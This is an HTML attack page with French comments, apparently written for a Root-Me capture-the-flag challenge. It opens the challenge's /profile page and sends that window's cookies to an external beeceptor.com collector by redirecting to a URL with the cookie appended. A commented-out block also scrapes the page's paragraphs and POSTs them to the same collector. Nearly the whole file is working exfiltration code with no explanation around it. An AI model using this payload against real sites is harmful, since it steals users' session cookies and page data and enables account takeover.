<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
</head>

<body id="body">
  <script>
    
  // Ouvrir une nouvelle fenêtre
const newWindow = window.open('http://challenge01.root-me.org:58003/profile');

// Attendre 1 seconde avant d'exécuter le reste du code
setTimeout(() => {
  if (newWindow) {
    try {
      /*
      // Récupérer tous les paragraphes de la nouvelle fenêtre
      const paragraphs = newWindow.document.querySelectorAll('p');
      let text = "";
      
      paragraphs.forEach(paragraph => {
        text += paragraph.textContent + "\n";
      });
      
      // Envoyer les données au serveur
      fetch("https://volatile.free.beeceptor.com", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ text })
      })
      .then(response => response.json())
      .then(data => console.log('Réponse du serveur:', data))
      .catch(error => console.error('Erreur lors de la requête:', error));
      */
    const newWindow2 = window.open('http://challenge01.root-me.org:58003/profile');
    console.log(newWindow2.document.cookie)
    newWindow.location = "https://volatile.free.beeceptor.com/c?" + newWindow2.document.cookie
        
    } catch (error) {
      console.error('Erreur lors de l\'accès au contenu:', error);
      // Gestion de l'erreur de politique de même origine (CORS)
    }
  }
}, 1000); // Délai d'une seconde
      
  </script>
</body>
